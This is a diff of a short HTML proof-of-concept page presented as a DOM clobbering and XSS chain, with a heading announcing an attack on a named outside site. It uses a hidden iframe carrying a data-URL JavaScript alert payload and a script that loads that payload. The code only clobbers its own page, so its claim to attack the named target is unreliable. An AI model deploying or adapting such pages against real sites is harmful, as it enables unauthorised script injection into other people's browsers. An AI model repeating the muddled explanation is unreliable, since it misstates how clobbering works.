@@ -1,16 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Remote DOM XSS Chain</title>
+  <meta charset="UTF-8">
+  <title>Remote DOM XSS - Unified Chain</title>
 </head>
 <body>
-  <iframe id="my_script" name="src" src="data:text/javascript,alert('Remote DOM XSS executed')"></iframe>
+  <h1>Launching DOM Clobbering Attack on thebrowser.company...</h1>
+
+  <!-- Clobbering the 'my_script' reference used in the target's DOM -->
+  <iframe 
+    id="my_script" 
+    name="src" 
+    src="data:text/javascript,alert('🔥 Remote DOM XSS from External!')" 
+    style="display:none">
+  </iframe>
 
   <script>
-    window.my_script = document.getElementById("my_script");
-    const s = document.createElement("script");
-    s.src = my_script.src;
+    // Rebind the clobbered iframe to window variable (some contexts need this)
+    window.my_script = document.getElementById('my_script');
+
+    // Create a <script> element with dynamic src from iframe
+    const s = document.createElement('script');
+    s.src = my_script.src;  // src = data:text/javascript,...
     document.body.appendChild(s);
   </script>
 </body>
 </html>
+
